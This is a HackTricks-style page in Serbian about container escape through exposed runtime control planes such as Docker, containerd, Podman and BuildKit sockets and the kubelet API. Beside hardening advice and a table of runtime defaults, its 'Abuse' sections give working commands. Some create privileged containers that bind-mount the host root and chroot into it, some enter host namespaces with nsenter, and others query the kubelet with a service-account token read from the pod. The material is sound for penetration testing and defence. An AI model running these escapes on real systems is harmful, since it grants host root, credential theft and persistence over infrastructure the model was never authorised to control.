# Izlaganje Runtime API-ja i Daemon-a

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni kompromisi kontejnera uopšte ne počinju sa namespace escape. Počinju sa pristupom control plane-u runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman, ili kubelet preko mountovanog Unix socket-a ili izloženog TCP listener-a, napadač može da zatraži novi kontejner sa boljim privilegijama, mount-uje host filesystem, pridruži se host namespace-ovima, ili pribavi osetljive informacije o node-u. U tim slučajevima, runtime API je stvarna security boundary, i kompromitovanje njega je funkcionalno blizu kompromitovanja host-a.

Zbog toga izlaganje runtime socket-a treba dokumentovati odvojeno od kernel zaštita. Kontejner sa običnim seccomp, capabilities, i MAC confinement i dalje može biti samo jedan API poziv udaljen od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` mountovan unutar njega. Kernel izolacija trenutnog kontejnera može raditi tačno kako je predviđeno, dok runtime management plane ostaje potpuno izložen.

## Modeli pristupa Daemon-u

Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socket-a na `unix:///var/run/docker.sock`. Istorijski je takođe bio izlagan udaljeno preko TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-zaštićenog listener-a na `2376`. Izlaganje daemon-a udaljeno bez jakog TLS i client authentication efektivno pretvara Docker API u remote root interfejs.

containerd, CRI-O, Podman, i kubelet izlažu slične površine visokog uticaja. Imena i workflow se razlikuju, ali logika ne. Ako interfejs omogućava pozivaocu da kreira workloads, mountuje host path-ove, pribavi credentials, ili menja pokrenute kontejnere, interfejs je privilegovani management channel i treba ga tako tretirati.

Uobičajene lokalne putanje koje vredi proveriti su:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stariji ili specijalizovaniji stack-ovi mogu takođe izlagati endpoint-e kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. Oni su ređi u modernim okruženjima, ali kada se naiđe na njih, treba ih tretirati sa istim oprezom zato što predstavljaju runtime-control površine, a ne obične application socket-e.

## Secure Remote Access

Ako daemon mora da bude izložen van lokalnog socket-a, konekcija treba da bude zaštićena sa TLS i po mogućstvu sa mutual authentication, tako da daemon proverava client-a, a client proverava daemon. Stara navika otvaranja Docker daemon-a na plain HTTP radi praktičnosti jedna je od najopasnijih grešaka u container administration jer API surface je dovoljno snažan da direktno kreira privileged containers.

Istorijski Docker configuration pattern je izgledao ovako:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostovima zasnovanim na systemd, komunikacija sa daemon-om može se takođe pojaviti kao `fd://`, što znači da proces nasleđuje prethodno otvoren socket od systemd umesto da ga direktno sam bind-uje. Važna lekcija nije tačna sintaksa već bezbednosna posledica. Onog trenutka kada daemon sluša izvan strogo dozvoljenog lokalnog socket-a, transport security i client authentication postaju obavezni, a ne opcioni hardening.

## Abuse

Ako je runtime socket prisutan, potvrdi koji je to, da li postoji kompatibilan client i da li je moguć raw HTTP ili gRPC pristup:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ove komande su korisne jer razlikuju mrtvu putanju, montiran ali nedostupan socket, i aktivan privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount ili deljenjem host namespace.

### When No Client Is Installed

Odsustvo `docker`, `podman`, ili nekog drugog prijateljskog CLI ne znači da je socket bezbedan. Docker Engine govori HTTP preko svog Unix socket-a, a Podman izlaže i Docker-compatible API i Libpod-native API kroz `podman system service`. To znači da minimalno okruženje sa samo `curl` i dalje može biti dovoljno da pokreće daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ovo je važno tokom post-exploitation jer defanzivci ponekad uklone uobičajene client binaries, ali ostave management socket mountovan. Na Podman hostovima, zapamtite da se high-value path razlikuje između rootful i rootless deployments: `unix:///run/podman/podman.sock` za rootful service instances i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless one.

### Full Example: Docker Socket To Host Root

Ako je `docker.sock` dostupan, klasičan escape je da se pokrene novi container koji mountuje host root filesystem i zatim `chroot` u njega:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Ovo omogućava direktno izvršavanje kao host-root preko Docker daemona. Uticaj nije ograničen na čitanje fajlova. Jednom unutra u novom containeru, napadač može da menja host fajlove, prikuplja credentials, implantira persistence, ili pokreće dodatne privileged workloads.

### Full Example: Docker Socket To Host Namespaces

Ako napadač više voli ulazak u namespace umesto pristupa samo fajlovima:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ova putanja dostiže host tako što traži od runtime-a da kreira novi container sa eksplicitnim izlaganjem host-namespace, umesto da iskorišćava postojeći.

### Full Example: containerd Socket

Montirani `containerd` socket je obično jednako opasan:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ako je prisutan klijent više nalik Docker-u, `nerdctl` može biti pogodniji od `ctr` zato što izlaže poznate flagove kao što su `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Uticaj je opet kompromitacija hosta. Čak i ako Docker-specific tooling nedostaje, drugi runtime API i dalje može da pruži istu administratorsku moć. Na Kubernetes čvorovima, `crictl` takođe može biti dovoljan za reconnaissance i interakciju sa containerima jer direktno govori CRI endpoint-u.

### BuildKit Socket

`buildkitd` je lako prevideti jer ga ljudi često smatraju samo "build backend-om", ali daemon je i dalje privileged control plane. Dostupan `buildkitd.sock` može napadaču da omogući da pokrene proizvoljne build korake, pregleda worker capabilities, koristi local contexts iz kompromitovanog okruženja i zatraži dangerous entitlements kao što su `network.host` ili `security.insecure` kada je daemon bio konfigurisan da ih dozvoli.

Korisne prve interakcije su:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ako daemon prihvata build zahteve, testirajte da li su dostupni insecure entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Tačan uticaj zavisi od konfiguracije daemon-a, ali rootful BuildKit servis sa permissive entitlements nije bezazlena developerska pogodnost. Tretirajte ga kao još jednu administrativnu površinu visoke vrednosti, posebno na CI runnerima i shared build node-ovima.

### Kubelet API Over TCP

kubelet nije container runtime, ali je i dalje deo node management plane-a i često spada u istu diskusiju o trust boundary. Ako je kubelet secure port `10250` dostupan iz workload-a, ili ako su node credentials, kubeconfigs, ili proxy rights izloženi, napadač možda može da enumeriše Pods, preuzme logs, ili izvrši komande u node-local container-ima bez ikakvog dodirivanja Kubernetes API server admission path-a.

Počnite sa jeftinim discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ako kubelet ili API-server proxy path autorizuje `exec`, klijent sa podrškom za WebSocket može to da pretvori u izvršavanje koda u drugim containerima na node-u. Ovo je takođe razlog zašto je `nodes/proxy` sa samo `get` permission opasnije nego što zvuči: request i dalje može da stigne do kubelet endpoints koji izvršavaju komande, a te direktne kubelet interakcije se ne pojavljuju u normalnim Kubernetes audit logs.

## Checks

Cilj ovih checks je da odgovore da li container može da dosegne bilo koji management plane koji je trebalo da ostane izvan trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Šta je zanimljivo ovde:

- Montiran runtime socket je obično direktna administrativna primitiva, a ne puko otkrivanje informacija.
- TCP listener na `2375` bez TLS treba tretirati kao uslov za remote-compromise.
- Environment variables kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran da komunicira sa host runtime-om.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` sluša na lokalnom socketu i daemon je obično rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Za običnu lokalnu upotrebu nije potreban dugotrajan privileged daemon; API sockets i dalje mogu biti exposed kada je `podman system service` enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet ne bi trebalo da bude široko reachable iz Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
